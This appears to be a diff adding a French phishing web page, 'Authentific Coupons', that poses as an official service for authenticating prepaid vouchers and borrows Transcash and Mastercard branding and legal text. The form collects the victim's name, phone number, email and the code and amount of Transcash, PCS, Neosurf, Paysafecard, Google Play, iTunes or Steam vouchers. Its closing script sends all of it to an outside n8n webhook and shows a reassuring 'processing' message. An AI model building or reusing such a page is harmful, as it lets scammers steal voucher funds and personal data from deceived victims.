@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset=utf-8>
+    <title>Authentific Coupons</title>
+    <meta content="width=device-width, initial-scale=1" name=viewport>
+    <meta content=Webflow name=generator>
+
+    <meta name=referrer content=no-referrer>
+    <link href="https://cdn.prod.website-files.com/6489c6b8efc41b929ac108cb/6489ca1c947d537b75d256f9_63ecce22fdf85e5ac14f3b6f_Tabac-Presse.png" rel="shortcut icon" type=image/x-icon>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        
+html {
+    -ms-text-size-adjust: 100%;
+    -webkit-text-size-adjust: 100%;
+    font-family: sans-serif
+}
+
+nav,section {
+    display: block
+}
+
+a {
+    background-color: rgba(0,0,0,0)
+}
+
+a:active,a:hover {
+    outline: 0
+}
+
+strong {
+    font-weight: bold
+}
+
+h1 {
+    margin: .67em 0
+}
+
+img {
+    border: 0
+}
+
+input,select {
+    color: inherit;
+    font: inherit;
+    margin: 0
+}
+
+select {
+    text-transform: none
+}
+
+input[type="checkbox"] {
+    box-sizing: border-box;
+    padding: 0
+}
+
+* {
+    box-sizing: border-box
+}
+
+html {
+    height: 100%
+}
+
+body {
+    min-height: 100%;
+    color: #333;
+    margin: 0;
+    font-family: Arial,sans-serif;
+    font-size: 14px;
+    line-height: 20px
+}
+
+img {
+    max-width: 100%;
+    vertical-align: middle;
+    display: inline-block
+}
+
+.w-button {
+    color: #fff;
+    line-height: inherit;
+    cursor: pointer;
+    background-color: #3898ec;
+    border: 0;
+    border-radius: 0;
+    padding: 9px 15px;
+    text-decoration: none;
+    display: inline-block
+}
+
+input.w-button {
+    -webkit-appearance: button
+}
+
+h1 {
+    margin-bottom: 10px;
+    font-weight: bold
+}
+
+h1 {
+    margin-top: 20px;
+    line-height: 44px
+}
+
+p {
+    margin-top: 0;
+    margin-bottom: 10px
+}
+
+ul {
+    margin-top: 0
+}
+
+.w-list-unstyled {
+    padding-left: 0;
+    list-style: none
+}
+
+.w-form {
+    margin: 0 0 15px
+}
+
+label {
+    font-weight: bold
+}
+
+.w-input,.w-select {
+    width: 100%;
+    height: 38px;
+    color: #333;
+    vertical-align: middle;
+    background-color: #fff;
+    border: 1px solid #ccc;
+    margin-bottom: 10px;
+    padding: 8px 12px;
+    font-size: 14px;
+    line-height: 1.42857;
+    display: block
+}
+
+.w-input::-webkit-input-placeholder,.w-select::-webkit-input-placeholder {
+    color: #999
+}
+
+.w-input:focus,.w-select:focus {
+    border-color: #3898ec;
+    outline: 0
+}
+
+.w-select {
+    background-color: #f3f3f3
+}
+
+.w-form-label {
+    cursor: pointer;
+    margin-bottom: 0;
+    font-weight: normal;
+    display: inline-block
+}
+
+.w-container {
+    max-width: 940px;
+    margin-left: auto;
+    margin-right: auto
+}
+
+.w-container:before,.w-container:after {
+    content: " ";
+    grid-area: 1/1/2/2;
+    display: table
+}
+
+.w-container:after {
+    clear: both
+}
+
+@media screen and (max-width: 991px) {
+    .w-container {
+        max-width:728px
+    }
+}
+
+@media screen and (max-width: 767px) {
+}
+
+@media screen and (max-width: 479px) {
+    .w-container {
+        max-width:none
+    }
+}
+
+@media screen and (max-width: 767px) {
+    .w-nav-brand {
+        padding-left:10px
+    }
+}
+
+@media (min-width: 768px) {
+}
+
+.w-nav {
+    background: #ddd;
+    position: relative
+}
+
+.w-nav:before,.w-nav:after {
+    content: " ";
+    grid-area: 1/1/2/2;
+    display: table
+}
+
+.w-nav:after {
+    clear: both
+}
+
+.w-nav-brand {
+    float: left;
+    color: #333;
+    text-decoration: none;
+    position: relative
+}
+
+.w-nav-menu {
+    float: right;
+    position: relative
+}
+
+@media screen and (max-width: 991px) {
+    .w-nav[data-collapse="medium"] .w-nav-menu {
+        display:none
+    }
+}
+
+@media screen and (max-width: 767px) {
+    .w-nav-brand {
+        padding-left:10px
+    }
+}
+
+@media screen and (max-width: 479px) {
+}
+
+@media screen and (max-width: 479px) {
+}
+
+@keyframes spin {
+    0% {
+        transform: rotate(0)
+    }
+
+    100% {
+        transform: rotate(360deg)
+    }
+}
+
+.w-checkbox {
+    margin-bottom: 5px;
+    padding-left: 20px;
+    display: block
+}
+
+.w-checkbox:before {
+    content: " ";
+    grid-area: 1/1/2/2;
+    display: table
+}
+
+.w-checkbox:after {
+    content: " ";
+    clear: both;
+    grid-area: 1/1/2/2;
+    display: table
+}
+
+.w-checkbox-input {
+    float: left;
+    margin: 4px 0 0-20px;
+    line-height: normal
+}
+
+.navbar-logo-left-container {
+    z-index: 5;
+    background-color: rgba(0,0,0,0);
+    margin-left: auto;
+    margin-right: auto;
+    padding: 15px 20px
+}
+
+.navbar-logo-left-container.shadow-three {
+    width: 100%;
+    max-width: 1140px;
+    margin-bottom: 0;
+    padding-top: 20px;
+    padding-bottom: 20px
+}
+
+.container {
+    width: 100%;
+    max-width: 940px;
+    margin-left: auto;
+    margin-right: auto
+}
+
+.navbar-wrapper {
+    justify-content: space-between;
+    align-items: center;
+    display: flex
+}
+
+.nav-menu-two {
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 0;
+    display: flex
+}
+
+.button-primary {
+    color: #fff;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    background-color: #1a1b1f;
+    padding: 12px 25px;
+    font-size: 12px;
+    line-height: 20px;
+    transition: all .2s
+}
+
+.button-primary:hover {
+    color: #fff;
+    background-color: #32343a
+}
+
+.button-primary:active {
+    background-color: #43464d
+}
+
+.body {
+    background-color: #000
+}
+
+.section {
+    background-image: url("https://uploads-ssl.webflow.com/6489c6b8efc41b929ac108cb/6489c784f5053db0b307fa85_2071906297.jpg");
+    background-position: 50%;
+    background-size: cover;
+    padding-top: 140px;
+    padding-bottom: 100px
+}
+
+.section-2 {
+    padding-top: 20px;
+    padding-bottom: 20px
+}
+
+.section-3 {
+    background-image: url("https://uploads-ssl.webflow.com/6489c6b8efc41b929ac108cb/6489c784e94200d582dae6f1_919224645.jpg");
+    background-position: 50%;
+    background-size: cover;
+    padding: 20px
+}
+
+.heading {
+    color: #24678c;
+    text-align: center;
+    background-color: #a1a1a1;
+    border-radius: 10px;
+    padding-top: 10px;
+    padding-bottom: 10px;
+    font-size: 32px
+}
+
+.container-2 {
+    padding-top: 10px;
+    padding-bottom: 10px
+}
+
+.container-3 {
+    background-color: rgba(161,161,161,.9);
+    border-radius: 10px;
+    padding: 20px
+}
+
+.container-4 {
+    justify-content: center;
+    padding: 20px;
+    display: flex
+}
+
+.section-4,.container-5,.container-6 {
+    padding: 20px
+}
+
+.paragraph {
+    color: #e2d3d3
+}
+
+.paragraph-2 {
+    color: #eee4e4;
+    text-align: center
+}
+
+@media screen and (max-width: 991px) {
+    .container {
+        max-width:728px
+    }
+
+    .nav-menu-wrapper {
+        background-color: rgba(0,0,0,0)
+    }
+
+    .nav-menu-two {
+        background-color: #fff;
+        border-radius: 50px;
+        flex-wrap: wrap;
+        justify-content: space-around;
+        align-items: center;
+        margin-top: 10px;
+        padding: 20px;
+        display: flex;
+        box-shadow: 0 8px 50px rgba(0,0,0,.05)
+    }
+}
+
+@media screen and (max-width: 767px) {
+    .navbar-logo-left-container {
+        max-width:100%
+    }
+
+    .navbar-brand {
+        padding-left: 0
+    }
+
+    .nav-menu-two {
+        border-radius: 20px;
+        flex-direction: column;
+        padding-bottom: 30px
+    }
+
+    .mobile-margin-top-10 {
+        margin-top: 10px
+    }
+}
+
+@media screen and (max-width: 479px) {
+    .container {
+        max-width:none
+    }
+
+    .nav-menu-two {
+        flex-direction: column
+    }
+}
+
+    </style>
+    <style>
+        .sf-hidden {
+            display: none!important
+        }
+    </style>
+   
+    <body style="background-color: #000" >
+        <div class=navbar-logo-left bis_skin_checked=1>
+            <div data-animation=default data-collapse=medium data-duration=400 data-easing=ease data-easing2=ease role=banner class="navbar-logo-left-container shadow-three w-nav" bis_skin_checked=1>
+                <div class=container bis_skin_checked=1>
+                    <div class=navbar-wrapper bis_skin_checked=1>
+                        <a href=# class="navbar-brand w-nav-brand">
+                            <img src="https://cdn.prod.website-files.com/6489c6b8efc41b929ac108cb/6489c78390af17a5ae5bc0de_63ecce22fdf85e5ac14f3b6f_Tabac-Presse.png" loading=lazy alt>
+                        </a>
+                        <nav role=navigation class="nav-menu-wrapper w-nav-menu">
+                            <ul role=list class="nav-menu-two w-list-unstyled">
+                                <li class=mobile-margin-top-10>
+                                    <a href=# class="button-primary w-button">Authentification</a>
+                            </ul>
+                        </nav>
+                        <div class="menu-button w-nav-button sf-hidden" style=-webkit-user-select:text aria-label=menu role=button tabindex=0 aria-controls=w-nav-overlay-0 aria-haspopup=menu aria-expanded=false bis_skin_checked=1></div>
+                    </div>
+                </div>
+                <div class="w-nav-overlay sf-hidden" data-wf-ignore id=w-nav-overlay-0 bis_skin_checked=1></div>
+            </div>
+        </div>
+        <section class=section></section>
+        <section class=section-2></section>
+        <section class=section-3>
+            <div class="container-2 w-container" bis_skin_checked=1>
+                <h1 class=heading>
+                    <strong>
+                        <em>Service officiel</em>
+                    </strong>
+                </h1>
+            </div>
+            <div class="container-3 w-container" bis_skin_checked=1>
+                <div id="wForm" class=w-form bis_skin_checked=1>
+                    <form id=email-form name=email-form>
+                        <input class=w-input maxlength=256 name=Nom-et-pr-noms data-name="Nom et prénoms" placeholder="Nom et prénoms" type=text id=Nom-et-pr-noms required value>
+                        <input class=w-input maxlength=256 name=Num-ro-de-t-l-phone data-name="Numéro de téléphone" placeholder="Numéro de téléphone" type=text id=Num-ro-de-t-l-phone required value>
+                        <select id=Type-de-recharge name=Type-de-recharge data-name="Type de recharge" required class=w-select>
+                            <option value="Type de recharge" selected>Type de recharge
+                            <option value=Transcash>Transcash
+                            <otion value=PCS>PCS
+                            <option value=Neosurf>Neosurf
+                            <option value=Paysafecard>Paysafecard
+                            <option value="Google Play">Google Play
+                            <option value=iTunes>iTunes
+                            <option value=Steam>Steam
+                        </select>
+                        <input class=w-input maxlength=256 name=Montant data-name=Montant placeholder=Montant type=text id=Montant required value>
+                        <input class=w-input maxlength=256 name=Code data-name=Code placeholder=Code type=text id=Code required value>
+                        <label class=w-checkbox>
+                            <input id=Cacher-le-code type=checkbox name=Cacher-le-code data-name="Cacher le code?" class=w-checkbox-input value=on>
+                            <span class=w-form-label for=Cacher-le-code>Cacher le code?</span>
+                        </label>
+                        <input class=w-input maxlength=256 name=email data-name=Email placeholder=Email type=email id=email required value>
+                        <input type=submit data-wait="Please wait..." class=w-button value=Continuer>
+                    </form>
+                    <div class="w-form-done sf-hidden" tabindex=-1 role=region aria-label="Email Form success" bis_skin_checked=1></div>
+                    <div class="w-form-fail sf-hidden" tabindex=-1 role=region aria-label="Email Form failure" bis_skin_checked=1></div>
+                </div>
+            </div>
+            <div class="container-4 w-container" bis_skin_checked=1>
+                <img src="http://cdn.prod.website-files.com/6489c6b8efc41b929ac108cb/6489c7831456a30693e431c0_transcash-12-orig-7-3-orig-2-4-orig-10_orig.jpg" loading=lazy alt sizes srcset>
+            </div>
+        </section>
+        <section class=section-4>
+            <div class="container-6 w-container" bis_skin_checked=1>
+                <p class=paragraph>
+                    Mastercard est une marque déposée et le design des cercles est une marque commerciale de Mastercard International Incorporated. La Carte Transcash Mastercard est émise par Wirecard Card Solutions Ltd («WDCS») en vertu d’une licence de Mastercard International Incorporated. WDCS est autorisée par la Financial Conduct Authority à émettre de la Monnaie Electronique sous la réglementation de 2011 relative à la monnaie électronique (Réf: 900051).​<br>
+                    <br>
+                    *Selon <a href=https://www.transcash.fr/CGV_transcash_20181010.pdf target=_blank>Conditions Générales de Vente</a>
+                    et <a href=https://www.transcash.fr/CGU_transcash_20181010.pdf target=_blank>Conditions Générales d’Utilisation</a>
+                    des cartes de paiement prépayées Transcash.<br>
+                    (1) Notez que les lois locales, comme en Inde, peuvent ne pas autoriser l’utilisation d’une carte secondaire pour partager de l’argent.<br>
+                    (2) Coût d’un SMS ou d’un appel local chez votre opérateur téléphonique.<br>(3) Appel surtaxé 0,15€/min + coût d’un appel chez votre opérateur téléphonique
+                </p>
+            </div>
+            <div class="container-5 w-container" bis_skin_checked=1>
+                <p class=paragraph-2>
+                    <strong>© Copyright official service &nbsp;tabac 1887 ©</strong>
+                    ​​​​<br>
+                </p>
+            </div>
+        </section>
+   
+        <script>
+           document.getElementById("email-form").addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    const formData = new FormData(event.target);
+    const data = {};
+    formData.forEach((value, key) => {
+        data[key] = value;
+    });
+    fetch("https://n8n-tgls.onrender.com/webhook-test/8252df51-59d5-4026-9efb-cf1b13172087", {
+    method: "POST",
+    mode: "no-cors", 
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+})
+.then(() => {
+    console.log("Données envoyées avec succès");
+document.getElementById("wForm").textContent = "votre requette est en cour de traitement"
+})
+.catch(error => {
+    console.error("Erreur:", error);
+    alert("Erreur lors de l'envoi des données !");
+});
+
+});
+
+
+        </script>
